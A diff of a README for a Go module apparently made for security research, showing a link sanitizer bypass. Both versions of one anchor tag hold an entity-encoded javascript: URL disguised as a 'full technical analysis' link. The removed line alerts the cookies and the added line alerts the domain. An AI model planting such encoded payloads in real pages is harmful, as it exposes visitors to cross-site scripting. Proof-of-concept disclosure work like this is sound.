@@ -4,9 +4,9 @@ Test Go module for security research.
 
 ## Security Research
 
-This module demonstrates a URL sanitizer bypass in pkg.go.dev.
+This module demonstrates a URL sanitizer bypass.
 
-<a href="javascript&amp;#58;alert(document.domain+&#34;&#10;Cookies: &#34;+document.cookie)">📄 Click here for full technical analysis</a>
+<a href="javascript&amp;#58;alert(document.domain)">📄 Click here for full technical analysis</a>
 
 ## Install
 
